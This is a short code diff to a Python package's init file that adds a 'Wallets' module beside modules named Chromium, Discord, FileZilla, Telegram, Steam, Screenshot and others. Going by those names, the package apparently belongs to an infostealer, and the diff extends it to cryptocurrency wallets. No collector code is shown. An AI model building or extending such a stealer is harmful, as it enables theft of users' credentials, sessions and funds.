@@ -6,5 +6,6 @@ from .screenshot import Screenshot
 from .system import System
 from .telegram import Telegram
 from .steam import Steam
+from .wallets import Wallets
 
-__all__ = ["Chromium", "Discord", "FileZilla", "Processes", "Screenshot", "System", "Telegram", "Steam"]
+__all__ = ["Chromium", "Discord", "FileZilla", "Processes", "Screenshot", "System", "Telegram", "Steam", "Wallets"]
